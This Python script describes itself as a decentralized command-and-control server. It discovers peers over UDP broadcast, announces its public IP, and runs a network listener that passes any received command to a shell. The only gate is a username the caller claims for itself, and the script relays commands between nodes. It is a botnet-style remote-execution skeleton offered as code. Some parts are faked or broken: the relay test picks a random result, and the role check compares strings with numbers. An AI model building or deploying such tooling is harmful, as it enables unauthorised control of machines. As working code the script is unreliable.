import socket
import asyncio
import subprocess
import threading
import os
import requests
import json
import random
import time

# Constants for roles and broadcast
ROLES = {"guest": 1, "user": 2, "admin": 3}
BROADCAST_PORT = 9999  # Port for broadcasting messages
DISCOVERY_PORT = 10000  # Port for discovery messages
COMMAND_PORT_RANGE = (8000, 8100)  # Port range for dynamic allocation

# Storage for external nodes (IP:Port)
nodes = set()

# RBAC class with role management
class RBAC:
    def __init__(self):
        self.users = {}

    def add_user(self, username, role):
        if role in ROLES:
            self.users[username] = role
            print(f"User {username} added with role {role}.")
        else:
            print(f"Role {role} does not exist.")

    def has_permission(self, username, level):
        return self.users.get(username, 0) >= level

# Command execution with Linux fail checks
def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.decode(), None
    except subprocess.CalledProcessError as e:
        return None, e.stderr.decode()

# Dynamic Port Allocation
def find_open_port():
    for port in range(*COMMAND_PORT_RANGE):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('0.0.0.0', port)) != 0:
                return port
    raise RuntimeError("No open ports available in range")

# Fail-safe mechanism for retrying connections
def retry_operation(operation, max_retries=5, delay=2, fallback=None):
    for i in range(max_retries):
        try:
            result = operation()
            if result is not None:
                return result
        except Exception as e:
            print(f"Attempt {i+1}/{max_retries} failed: {e}")
        time.sleep(delay)
    if fallback:
        return fallback()
    return None

# Broadcast server to announce availability
class BroadcastServer:
    def __init__(self, broadcast_ip="255.255.255.255", port=BROADCAST_PORT):
        self.broadcast_ip = broadcast_ip
        self.port = port

    def broadcast(self, message):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            message = message.encode('utf-8')
            sock.sendto(message, (self.broadcast_ip, self.port))
            print(f"Broadcasted message: {message.decode('utf-8')} to {self.broadcast_ip}:{self.port}")
            sock.close()
        except Exception as e:
            print(f"Failed to broadcast: {e}")

    def start_server(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('', self.port))
            print(f"Listening for broadcast messages on port {self.port}...")

            while True:
                data, addr = sock.recvfrom(1024)
                print(f"Received broadcast from {addr}: {data.decode('utf-8')}")
                nodes.add(addr)
        except Exception as e:
            print(f"Error starting broadcast server: {e}")

# P2P Client to connect to other nodes and execute commands
class P2PClient:
    def __init__(self, rbac, host='0.0.0.0', port=None):
        self.host = host
        self.port = port if port else find_open_port()
        self.rbac = rbac

    async def handle_client(self, reader, writer):
        try:
            data = await reader.read(100)
            message = data.decode()

            # Check if the data is a valid JSON command
            try:
                command_data = json.loads(message)
                print(f"Received {message} from {writer.get_extra_info('peername')}")
                response = await self.process_request(command_data)
                writer.write(response.encode())
            except json.JSONDecodeError:
                print(f"Received non-JSON data: {message}. Ignoring.")
                writer.write("Invalid data format, expected JSON.".encode())

            await writer.drain()
            writer.close()
        except Exception as e:
            print(f"Error handling client: {e}")

    async def process_request(self, data):
        username = data.get("username")
        command = data.get("command")
        role_needed = ROLES.get("user", 1)

        if not self.rbac.has_permission(username, role_needed):
            return "Permission denied."

        result, error = execute_command(command)
        if error:
            return f"Command failed: {error}"
        return result

    async def start_server(self):
        try:
            server = await asyncio.start_server(self.handle_client, self.host, self.port)
            addr = server.sockets[0].getsockname()
            print(f'Serving on {addr}')

            async with server:
                await server.serve_forever()
        except Exception as e:
            print(f"Error starting server: {e}")

# Relay node handling
class RelayNode:
    def __init__(self, rbac):
        self.rbac = rbac

    async def relay_command(self, target_ip, target_port, command, username):
        try:
            reader, writer = await asyncio.open_connection(target_ip, target_port)
            data = json.dumps({"command": command, "username": username})
            writer.write(data.encode())
            await writer.drain()

            response = await reader.read(100)
            print(f"Relay response: {response.decode()}")
            writer.close()
            return response.decode()
        except Exception as e:
            print(f"Relay failed: {e}")
            return None

# External node communication with retry and fallback
class ExternalNodeConnector:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    async def connect_to_external_node(self, target_ip, target_port):
        try:
            reader, writer = await asyncio.open_connection(target_ip, target_port)
            print(f"Connected to external node {target_ip}:{target_port}")
            writer.close()
        except Exception as e:
            print(f"Failed to connect to external node {target_ip}:{target_port}: {e}")
            fallback_node = self.find_local_node_to_relay(target_ip, target_port)
            if fallback_node:
                print(f"Falling back to local relay node {fallback_node}")
                await self.connect_to_external_node(fallback_node[0], fallback_node[1])

    def find_local_node_to_relay(self, target_ip, target_port):
        # Check if there's a local node that can act as a relay to the target IP
        for node in nodes:
            node_ip, node_port = node
            # Try to connect through each known node
            if retry_operation(lambda: self.test_node_relay(node_ip, node_port, target_ip, target_port), fallback=None):
                return node
        return None

    def test_node_relay(self, node_ip, node_port, target_ip, target_port):
        # Test if a node can relay the message to the target
        print(f"Testing node {node_ip}:{node_port} for relay to {target_ip}:{target_port}")
        # Simulate a relay check, you could implement this as needed
        return random.choice([True, False])

# Get the public IP address of the server
def get_public_ip():
    try:
        public_ip = requests.get('https://api.ipify.org').text
        print(f"Public IP: {public_ip}")
        return public_ip
    except Exception as e:
        print(f"Error retrieving public IP: {e}")
        return None

# Discovery mechanism to detect other nodes
class DiscoveryServer:
    def __init__(self, discovery_port=DISCOVERY_PORT):
        self.discovery_port = discovery_port

    def start(self):
        threading.Thread(target=self.listen_for_nodes).start()

    def listen_for_nodes(self):
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('', self.discovery_port))
            print(f"Listening for discovery on port {self.discovery_port}...")
            while True:
                data, addr = sock.recvfrom(1024)
                print(f"Node discovered: {addr}")
                nodes.add(addr)

    def discover_nodes(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        message = "DISCOVER_NODE"
        sock.sendto(message.encode('utf-8'), ('255.255.255.255', self.discovery_port))
        print(f"Discovery message sent on port {self.discovery_port}")
        sock.close()

# Decentralized Command and Control Server
class DecentralizedC2:
    def __init__(self, rbac, host='0.0.0.0', port=None):
        self.rbac = rbac
        self.host = host
        self.port = port if port else find_open_port()
        self.external_connector = ExternalNodeConnector(self.host, self.port)

    def add_node(self, ip, port):
        nodes.add((ip, port))
        print(f"Node {ip}:{port} added to the network.")

    def list_nodes(self):
        print("Current nodes in the network:")
        for ip, port in nodes:
            print(f"{ip}:{port}")

    def run(self):
        loop = asyncio.get_event_loop()
        loop.run_until_complete(self.external_connector.connect_to_external_node("192.168.1.100", self.port))

# Main execution
if __name__ == "__main__":
    rbac = RBAC()
    rbac.add_user("admin", "admin")
    rbac.add_user("user1", "user")

    # Get the public IP address
    public_ip = get_public_ip()
    if public_ip:
        # Run P2P server on the local interface, binding to all IPs
        p2p_client = P2PClient(rbac)
        relay = RelayNode(rbac)
        c2_server = DecentralizedC2(rbac)

        # Start the broadcast server
        broadcast_server = BroadcastServer()
        threading.Thread(target=broadcast_server.start_server).start()

        # Start the discovery server
        discovery_server = DiscoveryServer()
        discovery_server.start()
        discovery_server.discover_nodes()  # Discover other nodes

        # Broadcast availability
        broadcast_server.broadcast(f"Node available at {public_ip}:{p2p_client.port}")

        # Add external node
        c2_server.add_node("192.168.1.101", p2p_client.port)

        try:
            # Start server in a thread
            threading.Thread(target=lambda: asyncio.run(p2p_client.start_server())).start()

            # Attempt to connect to an external node
            c2_server.run()

            # Example relay command (optional)
            command_to_relay = "ls"
            username = "admin"
            asyncio.run(relay.relay_command("192.168.1.101", p2p_client.port, command_to_relay, username))
        except KeyboardInterrupt:
            print("Shutting down...")
